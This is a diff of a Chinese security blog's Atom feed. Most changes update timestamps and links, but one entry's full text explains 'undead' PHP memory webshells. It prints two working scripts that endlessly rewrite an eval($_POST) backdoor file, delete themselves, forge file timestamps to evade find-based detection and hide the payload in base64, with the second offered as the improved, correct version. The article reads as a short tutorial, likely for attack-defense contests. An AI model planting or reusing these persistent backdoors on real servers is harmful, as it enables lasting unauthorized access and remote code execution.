@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://unixcs.com/"/>
-  <updated>2019-08-05T02:49:06.690Z</updated>
+  <updated>2019-08-05T03:28:18.742Z</updated>
   <id>http://unixcs.com/</id>
   
   <author>
@@ -18,10 +18,10 @@
   
   <entry>
     <title>不死马</title>
-    <link href="http://unixcs.com//article/2019-08-05/1/"/>
-    <id>http://unixcs.com//article/2019-08-05/1/</id>
+    <link href="http://unixcs.com//article/2019-08-05/%E4%B8%8D%E6%AD%BB%E9%A9%AC.html"/>
+    <id>http://unixcs.com//article/2019-08-05/不死马.html</id>
     <published>2019-08-05T02:40:38.000Z</published>
-    <updated>2019-08-05T02:49:06.690Z</updated>
+    <updated>2019-08-05T03:28:18.742Z</updated>
     
     <content type="html"><![CDATA[<h2><span id="什么是不死马">什么是不死马？</span></h2><p><strong>内存马</strong>，通俗讲就是不死马，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行。</p><a id="more"></a><h2><span id="生成过程">生成过程</span></h2><p>不死马.php  →  上传到server  →  server执行文件  →  server本地无限循环生成 (一句话.php) </p><h2><span id="两种不死马">两种不死马</span></h2><ul><li>网上流传的不死马</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file = <span class="string">'2.php'</span>;</span><br><span class="line">$code = <span class="string">'&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72")&#123;@eval($_POST[a]);&#125; ?&gt;'</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">    system(<span class="string">'touch -m -d "2018-12-01 09:10:12" .2.php'</span>);</span><br><span class="line">    usleep(<span class="number">5000</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><code>ignore_user_abort(true);</code><br>函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</li><li><code>set_time_limit()</code><br>函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</li><li><code>unlink(__FILE__)</code><br>删除文件本身，以起到隐蔽自身的作用。</li><li><code>while</code><br>循环内每隔usleep(5000)即写新的后门文件</li><li><code>system()</code><br>执行的命令用于修改文件的创建或修改时间，可以绕过“find –name &#39;*.php&#39; –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。</li></ol><ul><li>升级版</li></ul><p>网上流传的不死马, while 里面只是并没有判断了这个文件是不是存在 ,<br>那么我只需要把这个文件中的 shell 注释掉就可以绕过你的内存木马了.</p><p>正确的姿势应该是这样 :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line"> set_time_limit(<span class="number">0</span>);</span><br><span class="line"> $file = <span class="string">'c.php'</span>;</span><br><span class="line"> $code = base64_decode(<span class="string">'PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+'</span>);</span><br><span class="line"> <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span>(md5(file_get_contents($file))===md5($code)) &#123;</span><br><span class="line">         file_put_contents($file, $code);</span><br><span class="line">     &#125;</span><br><span class="line">     usleep(<span class="number">50</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>参考:<a href="https://xz.aliyun.com/t/1530/" target="_blank" rel="noopener">https://xz.aliyun.com/t/1530/</a><br>  <a href="https://blog.csdn.net/ski_12/article/details/84920127" target="_blank" rel="noopener">https://blog.csdn.net/ski_12/article/details/84920127</a></p><br><h2><span id="拓展">拓展</span></h2><h3><span id="一句话木马">一句话木马</span></h3><p>参考：<a href="https://www.uedbox.com/post/6051/" target="_blank" rel="noopener">https://www.uedbox.com/post/6051/</a></p>]]></content>
     
@@ -38,8 +38,8 @@
   
   <entry>
     <title>代码高亮</title>
-    <link href="http://unixcs.com//article/2019-08-02/1/"/>
-    <id>http://unixcs.com//article/2019-08-02/1/</id>
+    <link href="http://unixcs.com//article/2019-08-02/%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE.html"/>
+    <id>http://unixcs.com//article/2019-08-02/代码高亮.html</id>
     <published>2019-08-02T03:35:20.000Z</published>
     <updated>2019-08-02T04:33:45.213Z</updated>
     
@@ -58,8 +58,8 @@
   
   <entry>
     <title>宽字节注入</title>
-    <link href="http://unixcs.com//article/2019-06-27/1/"/>
-    <id>http://unixcs.com//article/2019-06-27/1/</id>
+    <link href="http://unixcs.com//article/2019-06-27/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.html"/>
+    <id>http://unixcs.com//article/2019-06-27/宽字节注入.html</id>
     <published>2019-06-27T08:39:48.000Z</published>
     <updated>2019-08-04T06:33:33.873Z</updated>
     
@@ -78,8 +78,8 @@
   
   <entry>
     <title>about study</title>
-    <link href="http://unixcs.com//article/2019-06-19/1/"/>
-    <id>http://unixcs.com//article/2019-06-19/1/</id>
+    <link href="http://unixcs.com//article/2019-06-19/about%20study.html"/>
+    <id>http://unixcs.com//article/2019-06-19/about study.html</id>
     <published>2019-06-19T08:53:27.000Z</published>
     <updated>2019-07-10T12:57:58.841Z</updated>
     
@@ -98,8 +98,8 @@
   
   <entry>
     <title>Windous下Wfuzz的安装</title>
-    <link href="http://unixcs.com//article/2019-06-13/1/"/>
-    <id>http://unixcs.com//article/2019-06-13/1/</id>
+    <link href="http://unixcs.com//article/2019-06-13/Windous%E4%B8%8BWfuzz%E7%9A%84%E5%AE%89%E8%A3%85.html"/>
+    <id>http://unixcs.com//article/2019-06-13/Windous下Wfuzz的安装.html</id>
     <published>2019-06-13T12:07:54.000Z</published>
     <updated>2019-08-02T04:22:12.390Z</updated>
     
@@ -118,8 +118,8 @@
   
   <entry>
     <title>Docker</title>
-    <link href="http://unixcs.com//article/2019-06-11/1/"/>
-    <id>http://unixcs.com//article/2019-06-11/1/</id>
+    <link href="http://unixcs.com//article/2019-06-11/Docker.html"/>
+    <id>http://unixcs.com//article/2019-06-11/Docker.html</id>
     <published>2019-06-11T06:21:44.000Z</published>
     <updated>2019-08-04T08:47:56.886Z</updated>
     
@@ -138,8 +138,8 @@
   
   <entry>
     <title>about blog</title>
-    <link href="http://unixcs.com//article/2019-06-01/1/"/>
-    <id>http://unixcs.com//article/2019-06-01/1/</id>
+    <link href="http://unixcs.com//article/2019-06-01/about%20blog.html"/>
+    <id>http://unixcs.com//article/2019-06-01/about blog.html</id>
     <published>2019-06-01T05:15:17.000Z</published>
     <updated>2019-06-02T08:57:19.210Z</updated>
     
@@ -158,8 +158,8 @@
   
   <entry>
     <title>test</title>
-    <link href="http://unixcs.com//article/2019-05-31/1/"/>
-    <id>http://unixcs.com//article/2019-05-31/1/</id>
+    <link href="http://unixcs.com//article/2019-05-31/test.html"/>
+    <id>http://unixcs.com//article/2019-05-31/test.html</id>
     <published>2019-05-31T14:40:31.000Z</published>
     <updated>2019-06-01T07:34:38.117Z</updated>
     
@@ -182,8 +182,8 @@
   
   <entry>
     <title>Wfuzz初上手</title>
-    <link href="http://unixcs.com//article/2018-10-28/1/"/>
-    <id>http://unixcs.com//article/2018-10-28/1/</id>
+    <link href="http://unixcs.com//article/2018-10-28/fuzz.html"/>
+    <id>http://unixcs.com//article/2018-10-28/fuzz.html</id>
     <published>2018-10-27T16:00:00.000Z</published>
     <updated>2019-08-01T16:23:47.686Z</updated>
     
